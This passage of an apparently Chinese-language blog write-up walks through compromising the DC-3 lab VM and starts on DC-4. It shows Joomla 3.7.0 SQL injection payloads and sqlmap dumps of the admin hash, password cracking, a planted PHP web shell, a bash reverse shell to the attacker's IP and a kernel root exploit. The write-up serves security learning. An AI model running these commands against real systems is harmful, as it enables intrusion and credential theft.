 - &#x2F;media&#x2F;                         </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;modules&#x2F;                    </span><br><span class="line">[08:45:42] 200 -   31B  - &#x2F;plugins&#x2F;                                                     </span><br><span class="line">[08:45:42] 200 -  836B  - &#x2F;robots.txt.dist                                                      </span><br><span class="line">[08:45:44] 200 -   31B  - &#x2F;templates&#x2F;                                                                             </span><br><span class="line">[08:45:44] 200 -   31B  - &#x2F;templates&#x2F;index.html    </span><br><span class="line">[08:45:44] 200 -    0B  - &#x2F;templates&#x2F;protostar&#x2F;              </span><br><span class="line">[08:45:44] 200 -    0B  - &#x2F;templates&#x2F;system&#x2F;       </span><br><span class="line">[08:45:44] 200 -    0B  - &#x2F;templates&#x2F;beez3&#x2F;    </span><br><span class="line">[08:45:44] 200 -   31B  - &#x2F;tmp&#x2F;                                             </span><br><span class="line">[08:45:45] 200 -    2KB - &#x2F;web.config.txt</span><br></pre></td></tr></table></figure>



<p>因为知道CMS是joomla</p>
<p>joomscan一波发现版本号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u 192.168.33.138</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;components</span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;modules</span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;templates</span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;images&#x2F;banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info&#x2F;status files</span><br><span class="line">[++] Readable info&#x2F;status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;                                                                                                       </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Checking robots.txt existing                                                                                                                             </span><br><span class="line">[++] robots.txt is not found                                                                                                                                 </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Finding common backup files name                                                                                                                         </span><br><span class="line">[++] Backup files are not found                                                                                                                              </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Finding common log files name                                                                                                                            </span><br><span class="line">[++] error log is not found                                                                                                                                  </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Checking sensitive config.php.x file                                                                                                                     </span><br><span class="line">[++] Readable config files are not found</span><br></pre></td></tr></table></figure>





<h2 id="sql漏洞发现admin用户密码"><a href="#sql漏洞发现admin用户密码" class="headerlink" title="sql漏洞发现admin用户密码"></a>sql漏洞发现admin用户密码</h2><p>发现Joomla3.7.0</p>
<p>搜索一波漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla | grep &quot;3\.7&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Joomla! 3.7 - SQL Injection                                                    | php&#x2F;remote&#x2F;44227.php</span><br><span class="line">Joomla! 3.7.0 - &#39;com_fields&#39; SQL Injection                                     | php&#x2F;webapps&#x2F;42033.txt</span><br></pre></td></tr></table></figure>

<p>试了一下第一个，发现好像无法利用，打开一下第二个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Joomla 3.7.0 - Sql Injection</span><br><span class="line"># Date: 05-19-2017</span><br><span class="line"># Exploit Author: Mateus Lino</span><br><span class="line"># Reference: https:&#x2F;&#x2F;blog.sucuri.net&#x2F;2017&#x2F;05&#x2F;sql-injection-vulnerability-joomla-3-7.html</span><br><span class="line"># Vendor Homepage: https:&#x2F;&#x2F;www.joomla.org&#x2F;</span><br><span class="line"># Version: &#x3D; 3.7.0</span><br><span class="line"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><br><span class="line"># CVE : - CVE-2017-8917</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http:&#x2F;&#x2F;localhost&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml%27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;localhost&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: list[fullordering] (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(CASE WHEN (1573&#x3D;1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600&#x3D;6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND&#x2F;OR time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT * FROM (SELECT(SLEEP(5)))GDiu)</span><br></pre></td></tr></table></figure>

<p>用一下sqlmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p>发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[09:26:42] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)</span><br><span class="line">web application technology: Apache 2.4.18</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.1</span><br><span class="line">[09:26:43] [INFO] fetching database names</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;information_schema&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;joomladb&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;mysql&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;performance_schema&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;sys&#39;</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"></span><br><span class="line">[09:26:43] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 2671 times</span><br><span class="line">[09:26:43] [INFO] fetched data logged to text files under &#39;&#x2F;root&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;192.168.33.138&#39;</span><br></pre></td></tr></table></figure>

<p>爆个表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb --tables  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">[76 tables]</span><br><span class="line">+---------------------+</span><br><span class="line">| #__assets           |</span><br><span class="line">| #__associations     |</span><br><span class="line">| #__banner_clients   |</span><br><span class="line">| #__banner_tracks    |</span><br><span class="line">| #__banners          |</span><br><span class="line">| #__bsms_admin       |</span><br><span class="line">| #__bsms_books       |</span><br><span class="line">| #__bsms_comments    |</span><br><span class="line">| #__bsms_locations   |</span><br><span class="line">| #__bsms_mediafiles  |</span><br><span class="line">| #__bsms_message_typ |</span><br><span class="line">| #__bsms_podcast     |</span><br><span class="line">| #__bsms_series      |</span><br><span class="line">| #__bsms_servers     |</span><br><span class="line">| #__bsms_studies     |</span><br><span class="line">| #__bsms_studytopics |</span><br><span class="line">| #__bsms_teachers    |</span><br><span class="line">| #__bsms_templatecod |</span><br><span class="line">| #__bsms_templates   |</span><br><span class="line">| #__bsms_timeset     |</span><br><span class="line">| #__bsms_topics      |</span><br><span class="line">| #__bsms_update      |</span><br><span class="line">| #__categories       |</span><br><span class="line">| #__contact_details  |</span><br><span class="line">| #__content_frontpag |</span><br><span class="line">| #__content_rating   |</span><br><span class="line">| #__content_types    |</span><br><span class="line">| #__content          |</span><br><span class="line">| #__contentitem_tag_ |</span><br><span class="line">| #__core_log_searche |</span><br><span class="line">| #__extensions       |</span><br><span class="line">| #__fields_categorie |</span><br><span class="line">| #__fields_groups    |</span><br><span class="line">| #__fields_values    |</span><br><span class="line">| #__fields           |</span><br><span class="line">| #__finder_filters   |</span><br><span class="line">| #__finder_links_ter |</span><br><span class="line">| #__finder_links     |</span><br><span class="line">| #__finder_taxonomy_ |</span><br><span class="line">| #__finder_taxonomy  |</span><br><span class="line">| #__finder_terms_com |</span><br><span class="line">| #__finder_terms     |</span><br><span class="line">| #__finder_tokens_ag |</span><br><span class="line">| #__finder_tokens    |</span><br><span class="line">| #__finder_types     |</span><br><span class="line">| #__jbsbackup_timese |</span><br><span class="line">| #__jbspodcast_times |</span><br><span class="line">| #__languages        |</span><br><span class="line">| #__menu_types       |</span><br><span class="line">| #__menu             |</span><br><span class="line">| #__messages_cfg     |</span><br><span class="line">| #__messages         |</span><br><span class="line">| #__modules_menu     |</span><br><span class="line">| #__modules          |</span><br><span class="line">| #__newsfeeds        |</span><br><span class="line">| #__overrider        |</span><br><span class="line">| #__postinstall_mess |</span><br><span class="line">| #__redirect_links   |</span><br><span class="line">| #__schemas          |</span><br><span class="line">| #__session          |</span><br><span class="line">| #__tags             |</span><br><span class="line">| #__template_styles  |</span><br><span class="line">| #__ucm_base         |</span><br><span class="line">| #__ucm_content      |</span><br><span class="line">| #__ucm_history      |</span><br><span class="line">| #__update_sites_ext |</span><br><span class="line">| #__update_sites     |</span><br><span class="line">| #__updates          |</span><br><span class="line">| #__user_keys        |</span><br><span class="line">| #__user_notes       |</span><br><span class="line">| #__user_profiles    |</span><br><span class="line">| #__user_usergroup_m |</span><br><span class="line">| #__usergroups       |</span><br><span class="line">| #__users            |</span><br><span class="line">| #__utf8_conversion  |</span><br><span class="line">| #__viewlevels       |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>

<p>爆一下字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb -T &#39;#__users&#39; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| email    | non-numeric |</span><br><span class="line">| id       | numeric     |</span><br><span class="line">| name     | non-numeric |</span><br><span class="line">| params   | non-numeric |</span><br><span class="line">| password | non-numeric |</span><br><span class="line">| username | non-numeric |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>

<p>爆一下具体内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb -T &#39;#__users&#39; -C &#39;username,password&#39; --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>



<h2 id="对hash密码进行解密"><a href="#对hash密码进行解密" class="headerlink" title="对hash密码进行解密"></a>对hash密码进行解密</h2><p>需要对这个hash进行解密，可以使用John工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john dc3.txt		&#x2F;&#x2F;dc3.txt内容就是刚才的hash值</span><br></pre></td></tr></table></figure>

<p>得到密码snoopy，成功登录到了后台。</p>
<h2 id="后台连接一句话木马"><a href="#后台连接一句话木马" class="headerlink" title="后台连接一句话木马"></a>后台连接一句话木马</h2><p>之前dirsearch扫描扫到了templates模块，并且发现后台这个地方可以修改源代码，于是想到在index.php里添加一句话木马        <img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-2.png" alt="3-2"></p>
<p>但是连接不上，于是在这个目录下面新建了一个test.php里面写了一句话木马，而且连接成功。</p>
<h2 id="反弹bash到kali上"><a href="#反弹bash到kali上" class="headerlink" title="反弹bash到kali上"></a>反弹bash到kali上</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2233												&#x2F;&#x2F;在kali上执行</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.33.128【kali的ip】&#x2F;2233 0&gt;&amp;1&#39; 		&#x2F;&#x2F;在蚁剑连接机上执行</span><br></pre></td></tr></table></figure>

<p>关于反弹bash的原理，<a href="https://blog.csdn.net/Auuuuuuuu/article/details/89059176" target="_blank" rel="noopener">参考这篇</a></p>
<blockquote>
<p>为啥必须要bash -c？？？</p>
</blockquote>
<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><blockquote>
<p>接下来就是提权部分，但是查看了一下，没有可执行sudo命令的用户，没有suid权限的可执行命令或者文件，没有定时任务，没有权限滥用危险文件。万不得已只能试一下内核提权了。</p>
</blockquote>
<p>查看一下内核版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a:</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 16.04 LTS</span><br><span class="line">Release:        16.04</span><br><span class="line">Codename:       xenial</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a:</span><br><span class="line">Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>



<p>搜索一下Ubuntu16.04提权漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-3.png" alt="3-3"></p>
<p>经过一番探索，发现39772.txt可以利用，打开看一下利用方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">An exploit that puts all this together is in exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~&#x2F;ebpf_mapfd_doubleput$ .&#x2F;compile.sh</span><br><span class="line">user@host:~&#x2F;ebpf_mapfd_doubleput$ .&#x2F;doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&#39;ll have a root shell in &lt;&#x3D;60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">root@host:~&#x2F;ebpf_mapfd_doubleput# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span><br><span class="line"></span><br><span class="line">This exploit was tested on a Ubuntu 16.04 Desktop system.</span><br><span class="line"></span><br><span class="line">Fix: https:&#x2F;&#x2F;git.kernel.org&#x2F;cgit&#x2F;linux&#x2F;kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git&#x2F;commit&#x2F;?id&#x3D;8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proof of Concept: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;project-zero&#x2F;issues&#x2F;attachment?aid&#x3D;232552</span><br><span class="line">Exploit-DB Mirror: https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;exploitdb-bin-sploits&#x2F;raw&#x2F;master&#x2F;bin-sploits&#x2F;39772.zip</span><br></pre></td></tr></table></figure>

<p>先在kali攻击机上wget下来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;exploitdb-bin-sploits&#x2F;raw&#x2F;master&#x2F;bin-sploits&#x2F;39772.zip</span><br></pre></td></tr></table></figure>

<p>然后上传到本地服务器上。</p>
<blockquote>
<p>这里如果不想用80端口，也可以使用该命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9999</span><br></pre></td></tr></table></figure>
</blockquote>
<p>然后在交互shell上wget下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.33.128&#x2F;dc3.zip</span><br></pre></td></tr></table></figure>

<p>一开始出现了这样的问题</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-4.png" alt="3-4"></p>
<p>一开始以为是服务器端的问题，后来发现是这个文件夹没有可写的权限。</p>
<p>找了一个有可写权限的目录就下载成功了！</p>
<p>解压一下，然后先后按照教程执行两个脚本就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;compile.sh</span><br><span class="line">.&#x2F;doubleput</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-5.png" alt="3-5"></p>
<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫一下ip：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀AGsite)-[~]</span><br><span class="line">└─# nmap -sP 192.168.33.0&#x2F;24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-27 21:01 EDT</span><br><span class="line">Nmap scan report for 192.168.33.1</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report for 192.168.33.2</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">MAC Address: 00:50:56:F3:FB:E6 (VMware)</span><br><span class="line">Nmap scan report for 192.168.33.140</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">MAC Address: 00:0C:29:64:8A:3D (VMware)</span><br><span class="line">Nmap scan report for 192.168.33.254</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">MAC Address: 00:50:56:F1:32:23 (VMware)</span><br><span class="line">Nmap scan report for 192.168.33.128</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 28.11 seconds</span><br><span class="line"></span><br><span class="line">┌──(root💀AGsite)-[~]</span><br><span class="line">└─# nmap -p- -A -v 192.168.33.140</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-27 21:03 EDT</span><br><span class="line">NSE: Loaded 153 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 21:03</span><br><span class="line">Completed NSE at 21:03, 0.00s elapsed</span><br><span class="line">Initiating NSE at 21:03</span><br><span class="line">Completed NSE at 21:03, 0.00s elapsed</span><br><span class="line">Initiating NSE at 21:03</span><br><span class="line">Completed NSE at 21:03, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 21:03</span><br><span class="line">Scanning 192.168.33.140 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 21:03, 0.05s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 21:03</span><br><span class="line">Completed Parallel DNS resolution of 1 host. 